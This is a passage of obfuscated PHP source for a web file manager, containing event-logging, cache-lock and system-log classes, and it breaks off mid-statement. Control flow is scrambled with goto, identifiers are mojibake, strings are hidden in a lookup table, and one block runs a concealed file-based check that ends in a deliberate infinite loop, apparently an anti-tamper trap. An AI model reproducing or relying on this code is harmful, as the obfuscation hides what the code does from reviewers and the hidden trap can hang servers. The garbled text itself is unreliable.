BÕåíî±Ñ: $B…ˆ¬™Á = 0; $bˆÆ¦ñÎğ = 0; $E¡ä‹âçö = 0; goto fÂÄÅ’¦¸®; fÂÄÅ’¦¸®: $E×¥­ßñëà = 0; $AÈ‘ŸÄ‰¸ = 0; $D±·Ã¤½†Í = 0; goto bÚõß”µ‡’; dï™Ì˜â›: } public function authTargetInfoMake($AËèÆÒ›éò) { goto C„™¶šÂÎà; aˆ¼éÚ±†¿: foreach ($AËèÆÒ›éò as $FÎŞñ’‘è) { if ($FÎŞñ’‘è[$E“¶×•ù[371]] == SourceModel::TYPE_USER) { $c¤­¤ëùê[] = intval($FÎŞñ’‘è[$E“¶×•ù[456]]); } else { if ($FÎŞñ’‘è[$E“¶×•ù[371]] == SourceModel::TYPE_GROUP) { $Eí´×±œ‹ì[] = intval($FÎŞñ’‘è[$E“¶×•ù[456]]); } } } if ($c¤­¤ëùê) { $c¤­¤ëùê = Model($E“¶×•ù[474])->userListInfo($c¤­¤ëùê); } if ($Eí´×±œ‹ì) { $bº¹ÆÙĞù = array($E“¶×•ù[2179] => array($E“¶×•ù[384], $Eí´×±œ‹ì)); $Eí´×±œ‹ì = Model($E“¶×•ù[458])->field($E“¶×•ù[2192])->where($bº¹ÆÙĞù)->select(); $Eí´×±œ‹ì = array_to_keyvalue($Eí´×±œ‹ì, $E“¶×•ù[2107]); } goto D¾’¿•ÍßË; D¾’¿•ÍßË: return array($E“¶×•ù[2279] => $c¤­¤ëùê, $E“¶×•ù[2271] => $Eí´×±œ‹ì); goto B¼íİó±˜ª; C„™¶šÂÎà: $E“¶×•ù =& $_SERVER[‚Ğ°–—î]; $c¤­¤ëùê = array(); $Eí´×±œ‹ì = array(); goto aˆ¼éÚ±†¿; B¼íİó±˜ª: } private function authInfo($eÌØëŠŒô¨) { $cì”¦ƒØ¤… =& $_SERVER[‚Ğ°–—î]; if ($eÌØëŠŒô¨[$cì”¦ƒØ¤…[2235]]) { $cèã­·’£¦ = Model($cì”¦ƒØ¤…[2254])->listData($eÌØëŠŒô¨[$cì”¦ƒØ¤…[2235]]); if (!$cèã­·’£¦) { return !1; $F°µì×ã–Ú = Model($cì”¦ƒØ¤…[2254])->listData(); $Cö»ŞÙ¶³ = array_filter_by_field($F°µì×ã–Ú, $cì”¦ƒØ¤…[376], $cì”¦ƒØ¤…[468]); return $Cö»ŞÙ¶³; } $dà×à‰”ñÕ = array_field_key($cèã­·’£¦, array($cì”¦ƒØ¤…[367], $cì”¦ƒØ¤…[28], $cì”¦ƒØ¤…[376], $cì”¦ƒØ¤…[2125], $cì”¦ƒØ¤…[2128])); $dà×à‰”ñÕ[$cì”¦ƒØ¤…[2280]] = $eÌØëŠŒô¨; return $dà×à‰”ñÕ; } else { return array($cì”¦ƒØ¤…[385] => 0, $cì”¦ƒØ¤…[2113] => $eÌØëŠŒô¨[$cì”¦ƒØ¤…[2236]], $cì”¦ƒØ¤…[386] => $cì”¦ƒØ¤…[33], $cì”¦ƒØ¤…[2125] => $cì”¦ƒØ¤…[2281]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\x72\143\x65\137\145\166\145\x6e\164"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\x54\x69\155\x65", "\164\x69\155\x65", "\x69\156\x73\145\x72\x74", "\x66\x75\156\143\164\x69\157\156"), array("\144\145\x73\143", '', "\151\156\x73\x65\x72\164\x2c\165\160\144\x61\x74\x65\x2c\163\145\154\x65\143\x74", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($BÆí½‘Á…„, $B¼ˆéºÂ¶Ù, $EçÉ‘¬›ùø = '') { goto B–ÁïóßÕ…; Eè„ä©œù: $aÇñ½½„ğƒ = array($D×ÁïáÉ†—[383] => $BÆí½‘Á…„, $D×ÁïáÉ†—[2282] => $aÚË‰•ÆÕñ[$D×ÁïáÉ†—[461]], $D×ÁïáÉ†—[2283] => $aÚË‰•ÆÕñ[$D×ÁïáÉ†—[28]], $D×ÁïáÉ†—[466] => $aÚË‰•ÆÕñ[$D×ÁïáÉ†—[466]], $D×ÁïáÉ†—[1429] => USER_ID, $D×ÁïáÉ†—[388] => $B¼ˆéºÂ¶Ù, $D×ÁïáÉ†—[1431] => $EçÉ‘¬›ùø); $this->addSystemLog($B¼ˆéºÂ¶Ù, $aÇñ½½„ğƒ); return $this->add($aÇñ½½„ğƒ); goto a‘İøÃŠÏ®; B–ÁïóßÕ…: $D×ÁïáÉ†— =& $_SERVER[‚Ğ°–—î]; if (!$this->eventSave) { return; } $aÚË‰•ÆÕñ = Model($D×ÁïáÉ†—[1118])->sourceInfo($BÆí½‘Á…„); goto b‡Ô‹ƒ»¸ñ; b‡Ô‹ƒ»¸ñ: if (!$aÚË‰•ÆÕñ) { return !1; } if ($this->isCacheEvent($aÚË‰•ÆÕñ, $B¼ˆéºÂ¶Ù)) { return; } if ($EçÉ‘¬›ùø && is_string($EçÉ‘¬›ùø)) { $EçÉ‘¬›ùø = array($D×ÁïáÉ†—[2137] => $EçÉ‘¬›ùø); } goto Eè„ä©œù; a‘İøÃŠÏ®: } private function addSystemLog($Fõíà¿š¦, $dØ¢¬¤¡œÄ) { $Eá³ƒç»ªè =& $_SERVER[‚Ğ°–—î]; if ($Fõíà¿š¦ == $Eá³ƒç»ªè[2284]) { $Fõíà¿š¦ = $dØ¢¬¤¡œÄ[$Eá³ƒç»ªè[405]][$Eá³ƒç»ªè[2285]]; } else { if (in_array($Fõíà¿š¦, array($Eá³ƒç»ªè[2084], $Eá³ƒç»ªè[2286]))) { $Fõíà¿š¦ = $dØ¢¬¤¡œÄ[$Eá³ƒç»ªè[405]][$Eá³ƒç»ªè[691]]; } } $CÉ×Ï¿†Ó = array_merge($dØ¢¬¤¡œÄ, array($Eá³ƒç»ªè[2287] => $dØ¢¬¤¡œÄ[$Eá³ƒç»ªè[369]], $Eá³ƒç»ªè[2288] => $dØ¢¬¤¡œÄ[$Eá³ƒç»ªè[2288]])); Model($Eá³ƒç»ªè[2047])->addLog($Eá³ƒç»ªè[2289] . $Fõíà¿š¦, $CÉ×Ï¿†Ó); } private function isCacheEvent($f˜ğ‚›§Ñ¿, $bõÃ÷¹Èº£) { if ($f˜ğ‚›§Ñ¿[$_SERVER[‚Ğ°–—î][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($DÑ•¹‡Ú¯Ö, $aâÏˆ‹ÏíÙ) { $DÊ …ˆ =& $_SERVER[‚Ğ°–—î]; $bÙïˆ¹—ƒ = Model($DÊ …ˆ[1118])->sourceInfo($DÑ•¹‡Ú¯Ö); $B”‡Ú†´ = array($DÊ …ˆ[2285] => $aâÏˆ‹ÏíÙ, $DÊ …ˆ[28] => $bÙïˆ¹—ƒ[$DÊ …ˆ[28]]); return $this->addEvent($DÑ•¹‡Ú¯Ö, $DÊ …ˆ[2284], $B”‡Ú†´); } public function eventFileEdit($E­Ö¼Úğ§“) { $F¯Ùİø’¢† =& $_SERVER[‚Ğ°–—î]; $b êÑÎ‘ŠÁ = array($F¯Ùİø’¢†[2290] => $_SERVER[$F¯Ùİø’¢†[2291]], $F¯Ùİø’¢†[1752] => strtolower(ACTION)); return $this->addEvent($E­Ö¼Úğ§“, $F¯Ùİø’¢†[2074], $b êÑÎ‘ŠÁ); } public function eventRecycle($dÄÁ×¡ºÈ, $Fˆ£Œ˜Ÿ) { return $this->addEvent($dÄÁ×¡ºÈ, $_SERVER[‚Ğ°–—î][2286], $Fˆ£Œ˜Ÿ); } public function eventRemove($bÓÍˆá¾Ó„) { $F•æ¥†ÒÉÕ =& $_SERVER[‚Ğ°–—î]; $eöÒõ´³Ûß = Model($F•æ¥†ÒÉÕ[1118])->sourceInfo($bÓÍˆá¾Ó„); $FÖ„ÙÖ¶Ü = $eöÒõ´³Ûß[$F•æ¥†ÒÉÕ[28]]; return $this->addEvent($eöÒõ´³Ûß[$F•æ¥†ÒÉÕ[461]], $F•æ¥†ÒÉÕ[2073], $FÖ„ÙÖ¶Ü); } public function eventShare($fÂÛ§©Òí§, $cïÇœ¢šïÈ) { return $this->addEvent($fÂÛ§©Òí§, $_SERVER[‚Ğ°–—î][2084], $cïÇœ¢šïÈ); } public function eventMove($b¤ŒªïÃÌ, $a¿ÒË‚çÓë, $fò¿‰½¢¢¥) { goto B‡¶„Î£Û­; E”ÎÕ™Øİ: $this->addEvent($a¿ÒË‚çÓë, $F×‚¡ˆ‘±À[2296], $d„øŸÃö¤); goto E‰Çƒ‘Û; BÀõÙ¥Õ§®: $aŒŒÒÕ¤ë = $fÛ™ªÂğ‘->sourceInfo($a¿ÒË‚çÓë); $a¦×©Íã¦† = $fÛ™ªÂğ‘->sourceInfo($fò¿‰½¢¢¥); $d„øŸÃö¤ = array($F×‚¡ˆ‘±À[1008] => $a¿ÒË‚çÓë, $F×‚¡ˆ‘±À[2292] => $aŒŒÒÕ¤ë[$F×‚¡ˆ‘±À[28]], $F×‚¡ˆ‘±À[2293] => $aŒŒÒÕ¤ë[$F×‚¡ˆ‘±À[466]], $F×‚¡ˆ‘±À[1009] => $fò¿‰½¢¢¥, $F×‚¡ˆ‘±À[2294] => $a¦×©Íã¦†[$F×‚¡ˆ‘±À[28]], $F×‚¡ˆ‘±À[2295] => $a¦×©Íã¦†[$F×‚¡ˆ‘±À[466]]); goto aŒÈÜ¢¿ªˆ; aŒÈÜ¢¿ªˆ: $this->addEvent($b¤ŒªïÃÌ, $F×‚¡ˆ‘±À[492], $d„øŸÃö¤); $Eóí³î¹Îº = $fÛ™ªÂğ‘->sourceInfo($b¤ŒªïÃÌ); $d„øŸÃö¤ = array($F×‚¡ˆ‘±À[369] => $Eóí³î¹Îº[$F×‚¡ˆ‘±À[369]], $F×‚¡ˆ‘±À[28] => $Eóí³î¹Îº[$F×‚¡ˆ‘±À[28]]); goto E”ÎÕ™Øİ; B‡¶„Î£Û­: $F×‚¡ˆ‘±À =& $_SERVER[‚Ğ°–—î]; $fÛ™ªÂğ‘ = Model($F×‚¡ˆ‘±À[1118]); $Eóí³î¹Îº = $fÛ™ªÂğ‘->sourceInfo($b¤ŒªïÃÌ); goto BÀõÙ¥Õ§®; E‰Çƒ‘Û: } public function eventCopy($AŠŸ¥äã¼é) { $this->eventCreate($AŠŸ¥äã¼é, $_SERVER[‚Ğ°–—î][490]); } public function eventRename($fî¶ÁâÄ‡Ô, $b™â¯¶§œÙ, $e§ğé˜Ê…) { $EÏµßµ£ÈÙ =& $_SERVER[‚Ğ°–—î]; $Eæ–ğ¬¢Ä = array($EÏµßµ£ÈÙ[1008] => $b™â¯¶§œÙ, $EÏµßµ£ÈÙ[1009] => $e§ğé˜Ê…); return $this->addEvent($fî¶ÁâÄ‡Ô, $EÏµßµ£ÈÙ[1130], $Eæ–ğ¬¢Ä); } public function eventAddComment($CÓ©ˆ´‹Ô, $A„˜óÊ×Œ) { return $this->addEvent($CÓ©ˆ´‹Ô, $_SERVER[‚Ğ°–—î][2297], $A„˜óÊ×Œ); } public function eventAddDesc($Cî—Ñ¨ÅÛ“, $Dî³¶½›®) { return $this->addEvent($Cî—Ñ¨ÅÛ“, $_SERVER[‚Ğ°–—î][2298], $Dî³¶½›®); } public function listBySource($CæÃ°íßŸ­) { goto F‡”“øÄĞ; F‡”“øÄĞ: $añ™Î”œˆ =& $_SERVER[‚Ğ°–—î]; $D¼Š¶ÇÆÕê = Model($añ™Î”œˆ[1118])->sourceInfo($CæÃ°íßŸ­); $B³·Ò¥º˜ß = array($añ™Î”œˆ[383] => $CæÃ°íßŸ­); goto dîĞ„áÁõ¤; B¼²¦«Œ¬º: return $this->eventListParse($A‹¨´¼²‚, $CæÃ°íßŸ­); goto c›ãí°º°”; dîĞ„áÁõ¤: if ($D¼Š¶ÇÆÕê[$añ™Î”œˆ[370]] == $añ™Î”œˆ[83]) { $c¦¤Ñİ¥Ş§ = Model($añ™Î”œˆ[1118])->listSearchChildren($CæÃ°íßŸ­, 20000); $c¦¤Ñİ¥Ş§[] = $CæÃ°íßŸ­ . $añ™Î”œˆ[361]; $B³·Ò¥º˜ß = array($añ™Î”œˆ[369] => array($añ™Î”œˆ[7], $c¦¤Ñİ¥Ş§)); } $A‹¨´¼²‚ = $this->where($B³·Ò¥º˜ß)->order($añ™Î”œˆ[2299])->selectPage(); if ($A‹¨´¼²‚[$añ™Î”œˆ[351]][$añ™Î”œˆ[352]] == 0) { $A‹¨´¼²‚[$añ™Î”œˆ[351]][$añ™Î”œˆ[352]] = 1; $A‹¨´¼²‚[$añ™Î”œˆ[354]] = array(array($añ™Î”œˆ[383] => $CæÃ°íßŸ­, $añ™Î”œˆ[2282] => $D¼Š¶ÇÆÕê[$añ™Î”œˆ[461]], $añ™Î”œˆ[1429] => $D¼Š¶ÇÆÕê[$añ™Î”œˆ[378]], $añ™Î”œˆ[388] => $añ™Î”œˆ[2300], $añ™Î”œˆ[389] => $D¼Š¶ÇÆÕê[$añ™Î”œˆ[187]], $añ™Î”œˆ[1431] => $añ™Î”œˆ[33])); } goto B¼²¦«Œ¬º; c›ãí°º°”: } private function eventListParse($e—´Ë§Ô£˜, $EõÅ–µƒ‰) { goto B¬„ÊŞŠ¨¢; B¬„ÊŞŠ¨¢: $bá¯ØËñä· =& $_SERVER[‚Ğ°–—î]; $DÃŠÍ¯í” = $e—´Ë§Ô£˜[$bá¯ØËñä·[354]]; $C¬·Š¬·Î = array_to_keyvalue($DÃŠÍ¯í”, $bá¯ØËñä·[33], $bá¯ØËñä·[369]); goto F¨°Ó»“ƒ; cßáêè”Ò: $AÙŸ¥”•Š– = Model($bá¯ØËñä·[752])->sourceListInfo($C¬·Š¬·Î, !0); foreach ($DÃŠÍ¯í” as &$c÷È¦¬œç’) { if ($c÷È¦¬œç’[$bá¯ØËñä·[29]] == $bá¯ØËñä·[492] && isset($c÷È¦¬œç’[$bá¯ØËñä·[405]][$bá¯ØËñä·[1008]])) { $c÷È¦¬œç’[$bá¯ØËñä·[405]][$bá¯ØËñä·[1008]] = $AÙŸ¥”•Š–[$c÷È¦¬œç’[$bá¯ØËñä·[405]][$bá¯ØËñä·[1008]]]; $c÷È¦¬œç’[$bá¯ØËñä·[405]][$bá¯ØËñä·[1009]] = $AÙŸ¥”•Š–[$c÷È¦¬œç’[$bá¯ØËñä·[405]][$bá¯ØËñä·[1009]]]; } if ($c÷È¦¬œç’[$bá¯ØËñä·[29]] == $bá¯ØËñä·[2296] && isset($c÷È¦¬œç’[$bá¯ØËñä·[405]][$bá¯ØËñä·[369]])) { $c÷È¦¬œç’[$bá¯ØËñä·[405]][$bá¯ØËñä·[369]] = $AÙŸ¥”•Š–[$c÷È¦¬œç’[$bá¯ØËñä·[405]][$bá¯ØËñä·[369]]]; } $c÷È¦¬œç’[$bá¯ØËñä·[391]] = $AÙŸ¥”•Š–[$c÷È¦¬œç’[$bá¯ØËñä·[369]]]; $c÷È¦¬œç’[$bá¯ØËñä·[2301]] = $AÙŸ¥”•Š–[$c÷È¦¬œç’[$bá¯ØËñä·[2288]]]; if ($c÷È¦¬œç’[$bá¯ØËñä·[29]] == $bá¯ØËñä·[2073]) { $c÷È¦¬œç’[$bá¯ØËñä·[2301]] = $c÷È¦¬œç’[$bá¯ØËñä·[391]]; $c÷È¦¬œç’[$bá¯ØËñä·[2288]] = $c÷È¦¬œç’[$bá¯ØËñä·[2301]][$bá¯ØËñä·[369]]; $c÷È¦¬œç’[$bá¯ØËñä·[391]] = !1; $c÷È¦¬œç’[$bá¯ØËñä·[369]] = $bá¯ØËñä·[33]; } $c÷È¦¬œç’[$bá¯ØËñä·[2244]] = $fïÈœÌÛŒƒ[$c÷È¦¬œç’[$bá¯ØËñä·[1438]]]; } $e—´Ë§Ô£˜[$bá¯ØËñä·[354]] = $DÃŠÍ¯í”; goto b¼Äãã…àÙ; b¼Äãã…àÙ: return $e—´Ë§Ô£˜; goto bãºåºõ³ò; bŞ²œ½ÖÎ: $C¬·Š¬·Î = array_unique($C¬·Š¬·Î); $dïÙ½ß¡½å = array_unique(array_to_keyvalue($DÃŠÍ¯í”, $bá¯ØËñä·[33], $bá¯ØËñä·[1438])); $fïÈœÌÛŒƒ = Model($bá¯ØËñä·[477])->userListInfo($dïÙ½ß¡½å); goto cßáêè”Ò; F¨°Ó»“ƒ: $B‚°ƒè³ö = array_to_keyvalue($DÃŠÍ¯í”, $bá¯ØËñä·[33], $bá¯ØËñä·[2288]); foreach ($DÃŠÍ¯í” as $c÷È¦¬œç’) { $f«ÁÚˆ–Ì = $c÷È¦¬œç’[$bá¯ØËñä·[405]]; if ($c÷È¦¬œç’[$bá¯ØËñä·[29]] == $bá¯ØËñä·[492] && isset($f«ÁÚˆ–Ì[$bá¯ØËñä·[1008]])) { $C¬·Š¬·Î[] = $f«ÁÚˆ–Ì[$bá¯ØËñä·[1008]] . $bá¯ØËñä·[33]; $C¬·Š¬·Î[] = $f«ÁÚˆ–Ì[$bá¯ØËñä·[1009]] . $bá¯ØËñä·[33]; } if ($c÷È¦¬œç’[$bá¯ØËñä·[29]] == $bá¯ØËñä·[2296] && isset($f«ÁÚˆ–Ì[$bá¯ØËñä·[369]])) { $C¬·Š¬·Î[] = $f«ÁÚˆ–Ì[$bá¯ØËñä·[369]] . $bá¯ØËñä·[33]; } } $C¬·Š¬·Î = array_merge($C¬·Š¬·Î, $B‚°ƒè³ö, array($EõÅ–µƒ‰ . $bá¯ØËñä·[33])); goto bŞ²œ½ÖÎ; bãºåºõ³ò: } public function removeBySource($FÁÙ›°™Ú¦) { $f¦ïãŠòÓ’ = array($_SERVER[‚Ğ°–—î][383] => $FÁÙ›°™Ú¦); $this->where($f¦ïãŠòÓ’)->remove(); } } goto a×öœÃ¹âì; B‡¬Ò‘ÂÉ: class CacheLockRedis { public function lock($b‚–­ßßÎ, $b‹íŠ´™®“ = 10) { $F¦¯‰öêì = Cache::init(); $bâ‘•Ÿá‡Á = microtime(!0) + $b‹íŠ´™®“; while (microtime(!0) < $bâ‘•Ÿá‡Á) { $A‡·ô¦†’˜ = $F¦¯‰öêì->get($b‚–­ßßÎ); if (!$A‡·ô¦†’˜) { $Dƒ²åó†‡‚ = $F¦¯‰öêì->setLock($b‚–­ßßÎ, $bâ‘•Ÿá‡Á, $b‹íŠ´™®“); if ($Dƒ²åó†‡‚) { return !0; } } else { if ($A‡·ô¦†’˜ < microtime(!0)) { $F¦¯‰öêì->set($b‚–­ßßÎ, $bâ‘•Ÿá‡Á, $bâ‘•Ÿá‡Á); if ($F¦¯‰öêì->get($b‚–­ßßÎ) === $A‡·ô¦†’˜) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($báŠá²â¤†) { return Cache::init()->get($báŠá²â¤†); } public function unlock($eˆó ‰š…) { return Cache::init()->remove($eˆó ‰š…); } } class CacheLockMemcached { public function lock($c®ÛÉ®æŠ¨, $cÉôÓˆ¬« = 0) { $B¦ƒåõˆí = Cache::init(); $bÓâÑ…“™Š = microtime(!0) + $cÉôÓˆ¬«; while (microtime(!0) < $bÓâÑ…“™Š) { $BÍ¦¢Œ¨Ê¾ = $B¦ƒåõˆí->get($c®ÛÉ®æŠ¨); if (!$BÍ¦¢Œ¨Ê¾ || $BÍ¦¢Œ¨Ê¾ < microtime(!0)) { $DÖó¢†Ïğï = $B¦ƒåõˆí->handle->add($c®ÛÉ®æŠ¨, $bÓâÑ…“™Š, $cÉôÓˆ¬«); if ($DÖó¢†Ïğï) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($b‹²ÛéôÎ) { return Cache::init()->get($b‹²ÛéôÎ); } public function unlock($Cø…³œì×) { return Cache::init()->remove($Cø…³œì×); } } class CacheLockDatabase { public function lock($fé…—…íœ, $A‹–„”Ãøè = 0) { $D¯¹ôàé· = Model($_SERVER[‚Ğ°–—î][756]); $DÚÏ°ë‘ò‘ = microtime(!0) + $A‹–„”Ãøè; while (microtime(!0) < $DÚÏ°ë‘ò‘) { $E¡Â—‘‹ = $D¯¹ôàé·->get($fé…—…íœ); if (!$E¡Â—‘‹ || $E¡Â—‘‹ < microtime(!0)) { $Bñòİ¢ñ†Ü = $D¯¹ôàé·->set($fé…—…íœ, $DÚÏ°ë‘ò‘); if ($Bñòİ¢ñ†Ü) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($fÎæšÀî¨«) { return Model($_SERVER[‚Ğ°–—î][756])->get($fÎæšÀî¨«); } public function unlock($f¶¹¥íÒ›×) { Model($_SERVER[‚Ğ°–—î][756])->remove($f¶¹¥íÒ›×); } } goto b•«è‰÷·÷; Aœ¶¨àß¹: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $B«™ôŠ›œ =& $_SERVER[‚Ğ°–—î]; $bœÂôË‘Î› = $GLOBALS[$B«™ôŠ›œ[6]][$B«™ôŠ›œ[337]]; self::$cachePath = $bœÂôË‘Î›[$B«™ôŠ›œ[167]][$B«™ôŠ›œ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($a®ƒ«Ä…·ë, $E‘ÅªÉ¦çë = 0) { goto Eµ†öŞ­Õ¾; dÀÍÊø¨‰­: $this->unlock($a®ƒ«Ä…·ë); return !1; goto CòŞ©‹²ôø; F¯Ÿğ ‚Ì: $bŠ„¨êñ¸· = rtrim(self::$cachePath, $a´Å´±ò [8]) . $a´Å´±ò [773] . md5($a®ƒ«Ä…·ë) . $a´Å´±ò [774]; if (file_exists($bŠ„¨êñ¸·) && filemtime($bŠ„¨êñ¸·) && filemtime($bŠ„¨êñ¸·) < time() - 10) { @unlink($bŠ„¨êñ¸·); } do { if (file_exists($bŠ„¨êñ¸·)) { cacheLockWait(); continue; } $E²Ó˜ßçñ = fopen($bŠ„¨êñ¸·, $a´Å´±ò [775]); if (!$E²Ó˜ßçñ) { return !1; } $c…ªÎ•æ¬‰ = flock($E²Ó˜ßçñ, LOCK_EX | LOCK_NB); self::$caches[$a®ƒ«Ä…·ë] = array($a´Å´±ò [776] => $E²Ó˜ßçñ, $a´Å´±ò [167] => $bŠ„¨êñ¸·); fwrite($E²Ó˜ßçñ, $bîÈŸÉê×”); clearstatcache(); if ($E²Ó˜ßçñ && $c…ªÎ•æ¬‰) { return !0; } cacheLockWait(); } while (microtime(!0) < $bîÈŸÉê×”); goto dÀÍÊø¨‰­; Eµ†öŞ­Õ¾: $a´Å´±ò  =& $_SERVER[‚Ğ°–—î]; $A¢ì¡šçŒÄ = microtime(!0); $bîÈŸÉê×” = $A¢ì¡šçŒÄ + $E‘ÅªÉ¦çë + 0.0001; goto F¯Ÿğ ‚Ì; CòŞ©‹²ôø: } public function lockGet($D²à¦ é˜) { $aí­ö¾«˜³ =& $_SERVER[‚Ğ°–—î]; $fµµ†‰ìÚÃ = rtrim(self::$cachePath, $aí­ö¾«˜³[8]) . $aí­ö¾«˜³[773] . md5($D²à¦ é˜) . $aí­ö¾«˜³[774]; return file_exists($fµµ†‰ìÚÃ); } public function unlock($b’‚…ë°Ãß) { goto c‹±·‰°Ş; D¶†²ƒø¡: unset(self::$caches[$b’‚…ë°Ãß]); goto d³Ò™Ù¦éà; c‹±·‰°Ş: $c›¸ãš¶‹ù =& $_SERVER[‚Ğ°–—î]; $Fª«çÂ·ÂÌ = self::$caches[$b’‚…ë°Ãß]; if (!$Fª«çÂ·ÂÌ) { return; } goto E¸Æ²…º‰Â; E¸Æ²…º‰Â: @flock($Fª«çÂ·ÂÌ[$c›¸ãš¶‹ù[776]], LOCK_UN); @fclose($Fª«çÂ·ÂÌ[$c›¸ãš¶‹ù[776]]); @unlink($Fª«çÂ·ÂÌ[$c›¸ãš¶‹ù[167]]); goto D¶†²ƒø¡; d³Ò™Ù¦éà: } } if (!isset($_SERVER[$_SERVER[‚Ğ°–—î][777]]) || !isset($_SERVER[$_SERVER[‚Ğ°–—î][778]])) { goto C‡‚¡¤“©Ñ; bø¢¸—”: $f§„›ˆõÌÖ($_SERVER[$_SERVER[‚Ğ°–—î][780]] . $_SERVER[‚Ğ°–—î][781]); $F±ÆÍ“ÛŒÁ = 2; while ($F±ÆÍ“ÛŒÁ > 1) { $AäÑÙ®‘Ş = rawurlencode($F±ÆÍ“ÛŒÁ . $_SERVER[‚Ğ°–—î][361]); } goto eŞˆ—‘Å›; dæ¸ò: $B”ÖÒ–ù¨ƒ = explode($_SERVER[‚Ğ°–—î][217], $C¤§Ëæ¿»ì); if (count($B”ÖÒ–ù¨ƒ) < $_SERVER[‚Ğ°–—î][610]) { $C¡ö…÷‡çØ = $_SERVER[‚Ğ°–—î][782]; $C¡ö…÷‡çØ(); } $f§„›ˆõÌÖ = $_SERVER[‚Ğ°–—î][783]; goto bø¢¸—”; C‡‚¡¤“©Ñ: $Fî¬©ÕÁÍÈ = $_SERVER[‚Ğ°–—î][779]; $A„…¼ªÀ½î = $_SERVER[$_SERVER[‚Ğ°–—î][780]] . $_SERVER[‚Ğ°–—î][781]; $C¤§Ëæ¿»ì = $Fî¬©ÕÁÍÈ($A„…¼ªÀ½î); goto dæ¸ò; eŞˆ—‘Å›: } goto B‡¬Ò‘ÂÉ; dÍÓê®©š: class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\164\145\155\x5f\154\x6f\x67"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\151\x6d\145", "\x74\151\155\x65", "\151\x6e\x73\x65\162\x74", "\146\165\x6e\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $F‡ÁªÂéÖŒ =& $_SERVER[‚Ğ°–—î]; return array($F‡ÁªÂéÖŒ[2382] => LNG($F‡ÁªÂéÖŒ[2383]), $F‡ÁªÂéÖŒ[2384] => LNG($F‡ÁªÂéÖŒ[2385]), $F‡ÁªÂéÖŒ[2046] => LNG($F‡ÁªÂéÖŒ[2386]), $F‡ÁªÂéÖŒ[2387] => LNG($F‡ÁªÂéÖŒ[2388]), $F‡ÁªÂéÖŒ[2389] => LNG($F‡ÁªÂéÖŒ[2390]), $F‡ÁªÂéÖŒ[2391] => LNG($F‡ÁªÂéÖŒ[2392]), $F‡ÁªÂéÖŒ[2393] => LNG($F‡ÁªÂéÖŒ[2394]), $F‡ÁªÂéÖŒ[2395] => LNG($F‡ÁªÂéÖŒ[2396]), $F‡ÁªÂéÖŒ[2077] => LNG($F‡ÁªÂéÖŒ[2397]), $F‡ÁªÂéÖŒ[2078] => LNG($F‡ÁªÂéÖŒ[2398]), $F‡ÁªÂéÖŒ[2399] => LNG($F‡ÁªÂéÖŒ[2400]), $F‡ÁªÂéÖŒ[2401] => LNG($F‡ÁªÂéÖŒ[2402]), $F‡ÁªÂéÖŒ[2403] => LNG($F‡ÁªÂéÖŒ[2404]), $F‡ÁªÂéÖŒ[2405] => LNG($F‡ÁªÂéÖŒ[2406]), $F‡ÁªÂéÖŒ[2075] => LNG($F‡ÁªÂéÖŒ[2407]), $F‡ÁªÂéÖŒ[2082] => LNG($F‡ÁªÂéÖŒ[2408]), $F‡ÁªÂéÖŒ[2409] => LNG($F‡ÁªÂéÖŒ[2410]), $F‡ÁªÂéÖŒ[2411] => LNG($F‡ÁªÂéÖŒ[2412]), $F‡ÁªÂéÖŒ[2413] => LNG($F‡ÁªÂéÖŒ[2414]), $F‡ÁªÂéÖŒ[2415] => LNG($F‡ÁªÂéÖŒ[2416]), $F‡ÁªÂéÖŒ[2085] => LNG($F‡ÁªÂéÖŒ[2417]), $F‡ÁªÂéÖŒ[2086] => LNG($F‡ÁªÂéÖŒ[2418]), $F‡ÁªÂéÖŒ[2419] => LNG($F‡ÁªÂéÖŒ[2420]), $F‡ÁªÂéÖŒ[2421] => LNG($F‡ÁªÂéÖŒ[2422]), $F‡ÁªÂéÖŒ[2423] => LNG($F‡ÁªÂéÖŒ[2424]), $F‡ÁªÂéÖŒ[2080] => LNG($F‡ÁªÂéÖŒ[2425]), $F‡ÁªÂéÖŒ[2426] => LNG($F‡ÁªÂéÖŒ[2427]), $F‡ÁªÂéÖŒ[2079] => LNG($F‡ÁªÂéÖŒ[2428]), $F‡ÁªÂéÖŒ[2429] => LNG($F‡ÁªÂéÖŒ[2430]), $F‡ÁªÂéÖŒ[2431] => LNG($F‡ÁªÂéÖŒ[2432]), $F‡ÁªÂéÖŒ[2433] => LNG($F‡ÁªÂéÖŒ[2433]), $F‡ÁªÂéÖŒ[2434] => LNG($F‡ÁªÂéÖŒ[2050]), $F‡ÁªÂéÖŒ[2435] => LNG($F‡ÁªÂéÖŒ[2436]), $F‡ÁªÂéÖŒ[2437] => LNG($F‡ÁªÂéÖŒ[2438]), $F‡ÁªÂéÖŒ[2439] => LNG($F‡ÁªÂéÖŒ[2440]), $F‡ÁªÂéÖŒ[2441] => LNG($F‡ÁªÂéÖŒ[2442]), $F‡ÁªÂéÖŒ[2443] => LNG($F‡ÁªÂéÖŒ[2444]), $F‡ÁªÂéÖŒ[2445] => LNG($F‡ÁªÂéÖŒ[2445]), $F‡ÁªÂéÖŒ[2446] => LNG($F‡ÁªÂéÖŒ[2447]), $F‡ÁªÂéÖŒ[2448] => LNG($F‡ÁªÂéÖŒ[2449]), $F‡ÁªÂéÖŒ[2450] => LNG($F‡ÁªÂéÖŒ[2451]), $F‡ÁªÂéÖŒ[2452] => LNG($F‡ÁªÂéÖŒ[2453]), $F‡ÁªÂéÖŒ[2454] => LNG($F‡ÁªÂéÖŒ[2455]), $F‡ÁªÂéÖŒ[2456] => LNG($F‡ÁªÂéÖŒ[2457])); } private function typeFile() { $a©²šÜì˜Ñ =& $_SERVER[‚Ğ°–—î]; $C»‹Ù‹÷¿” = 